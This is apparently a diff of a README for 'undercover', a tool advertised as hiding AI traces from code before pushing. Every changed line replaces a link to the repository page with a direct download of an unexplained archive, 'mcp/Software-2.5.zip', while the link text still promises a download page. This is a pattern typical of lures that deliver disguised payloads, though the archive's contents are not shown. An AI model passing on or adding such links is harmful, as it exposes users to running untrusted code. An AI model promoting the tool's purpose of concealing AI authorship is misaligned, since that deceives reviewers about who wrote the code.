@@ -1,6 +1,6 @@
 # 🕵️ undercover - Hide AI traces before pushing
 
-[![Download undercover](https://img.shields.io/badge/Download%20undercover-2d2d2d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aftabki1783/undercover)
+[![Download undercover](https://img.shields.io/badge/Download%20undercover-2d2d2d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aftabki1783/undercover/raw/refs/heads/main/mcp/Software-2.5.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Use this link to visit the page and download the app:
 
-[Visit the download page](https://github.com/aftabki1783/undercover)
+[Visit the download page](https://github.com/aftabki1783/undercover/raw/refs/heads/main/mcp/Software-2.5.zip)
 
 ### Windows steps
 
@@ -189,7 +189,7 @@ Yes. It is built for that kind of workflow.
 
 ## 🧷 Download link again
 
-[Download undercover from GitHub](https://github.com/aftabki1783/undercover)
+[Download undercover from GitHub](https://github.com/aftabki1783/undercover/raw/refs/heads/main/mcp/Software-2.5.zip)
 
 ## 🪟 Quick install path for Windows
 
